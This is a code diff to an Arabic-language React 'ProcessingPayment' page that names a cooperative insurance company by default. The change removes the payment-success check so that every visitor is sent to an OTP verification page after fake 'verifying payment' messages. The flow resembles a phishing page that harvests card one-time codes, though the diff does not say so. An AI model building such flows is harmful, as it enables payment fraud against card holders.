@@ -9,7 +9,6 @@ const ProcessingPayment = () => {
   
   const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني";
   const price = searchParams.get("price") || "411.15";
-  const success = searchParams.get("success") === "true";
 
   const messages = [
     "جاري التحقق من عملية الدفع...",
@@ -24,18 +23,16 @@ const ProcessingPayment = () => {
       setMessageIndex((prev) => (prev + 1) % messages.length);
     }, 1000);
 
-    // Navigate after processing
+    // Navigate to OTP verification after processing
     const navigationTimer = setTimeout(() => {
-      if (success) {
-        navigate(`/payment-success?company=${encodeURIComponent(companyName)}&price=${price}`);
-      }
+      navigate("/otp-verification");
     }, 4000);
 
     return () => {
       clearInterval(messageTimer);
       clearTimeout(navigationTimer);
     };
-  }, [navigate, success, companyName, price]);
+  }, [navigate]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
